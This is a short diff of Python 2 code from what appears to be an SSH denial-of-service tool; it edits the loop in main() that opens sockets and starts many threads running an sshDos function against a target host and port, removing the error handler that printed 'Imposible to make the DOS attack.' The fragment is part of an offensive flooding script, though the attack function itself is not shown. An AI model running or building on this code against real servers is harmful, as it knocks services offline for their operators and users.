@@ -181,8 +181,4 @@ def main():
 		        	for att in range(threads):
 					sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 					t = Thread(target=sshDos, args=(host, port, userfdos, sock, defTime))
-					try:
-			      			t.start()
-					except:
-						print "Imposible to make the DOS attack."
-						exit(1)
+			      		t.start()
